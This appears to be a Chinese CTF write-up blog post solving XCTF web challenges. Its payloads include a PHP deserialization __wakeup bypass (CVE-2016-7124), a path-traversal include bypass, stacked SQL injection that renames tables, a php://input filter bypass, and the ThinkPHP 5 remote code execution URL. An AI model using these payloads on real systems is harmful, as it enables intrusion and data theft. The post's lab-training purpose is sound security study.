---
title: XCTF-Web 进阶 0x01
urlname: XCTF-WEB-M-0x01
tags: XCTF
abbrlink: 34261
date: 2020-10-02 19:00:00
---

## unserialize3

> CVE-2016-7124

```php
<?php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
?code=
```

`__wakeup()`特性：`unserialize()`时会自动调用。

__wakeup()可以被绕过，漏洞版本为PHP5 < 5.6.25或PHP7 < 7.0.10。

漏洞描述：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。

根据提示，可知code参数是可攻击层面入口。

根据题目构造Payload：

```php
$code = new xctf();
echo serialize($code);

>>> O:4:"xctf":1:{s:4:"flag";s:3:"111";}  //输出的原始结果
>>> O:4:"xctf":3:{s:4:"flag";s:3:"111";}  //修改后的结果
```

最终Payload： ?code=O:4:"xctf":3:{s:4:"flag";s:3:"111";}



## warmup FROM HCTF 2018

HCTF2018 的签到题。

审查元素得到source.php，进入之后得到源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

放入调试程序中。

```php
<?php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
$page = "source.php?file=../../../../../../../ffffllllaaaagggg";

if (! isset($page) || !is_string($page)) {				// 判断是否字符串
				echo "0.you can't see it<br>";
				echo '1.'.$page.'<br>';
            }

            if (in_array($page, $whitelist)) {			// 是否在白名单
				echo '2.'.$page.'<br>';
            }

            $_page = mb_substr(							// 截取第一个问号处前的字符串
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {			// 白名单检测
                echo '3.'.$_page.'<br>';
            }

            $_page = urldecode($page);					// url编码解码
            $_page = mb_substr(							// 截取第一个问号处前的字符串
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {			
                // return true;
                echo '4.'.$_page.'<br>';
            }
            echo '5.'."you can't see it<br>";
            // return false;
            echo '6.'.$_page.'<br>';
?>
    
    
// 输出
    
// >>> you can't see it
// >>> source.php%3ffile=../../../../../../../ffffllllaaaagggg
```

观测此字符串可以绕过。由此构造Payload: `source.php?file=source.php%3ffile=../../../../../../../ffffllllaaaagggg` 通过。

> 疑惑：为什么`index.php?file=source.php?/../../../../ffffllllaaaagggg`和`index.php?file=source.php%253f/../../../../ffffllllaaaagggg`是可以通过的。



## * supersqli FROM 强网杯 2019 

Github & Docker： `https://github.com/glzjin/qwb_2019_supersqli.git`

输入2，无反应。输入 1 确认，返回：

```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
```

输入 `1'` 返回：

```
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

输入 `1' union select schema_name from information_schema.schemata;` ，返回：

```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

确定过滤了上述词。

使用堆叠注入。

`1'; show tables;#`  输出如下：

```php
array(1) {
  [0]=>
  string(16) "1919810931114514"
}
array(1) {
  [0]=>
  string(5) "words"
}
```

查询`1919810931114514`表的字段 `1'; show columns from `1919810931114514`;

 (数值为表名操作时要加反引号)

```php
rray(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

查询`words`表的字段 `1'; show columns from words;`

```php
array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

很明显，`words`表具有对应关系，推测是本题使用的默认表：传入的`inject`参数赋值给字段`id`，通过`id`查询对应的`data`值。

禁用列表为：`select|update|delete|drop|insert|where`

没有禁用：`rename|alert`

故而可以将words表偷梁换柱：将`words`更名为`words2`，将数字表更名为`words`，将原数字表的字段名flag改为id。

```mysql
1';rename tables `words` to `words2`;
rename tables `1919810931114514` to `words`; 
alter table `words` change `flag` `id` varchar(99);#
```

由于不知道flag具体值（当然不知道啊），使用`1' or 1=1`确保判断条件为真，得到flag。



## Web_php_include

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {  
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

`strstr`函数对大小写敏感。使用`php://input`与`POST`方法配合在请求体中写入指令获得信息。



## php_rce

Vulhub：https://vulhub.org/#/environments/thinkphp/5-rce/

环境：PHP V7.2.5  ThinkPHP V5.0.20

没有什么提示，打开robots.txt也没有，再回看标题RCE，上网找此版本，找到Vulhub POC。

`http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`

flag在根目录。



## upload1

JS检验文件格式，直接关闭Javascript即可。

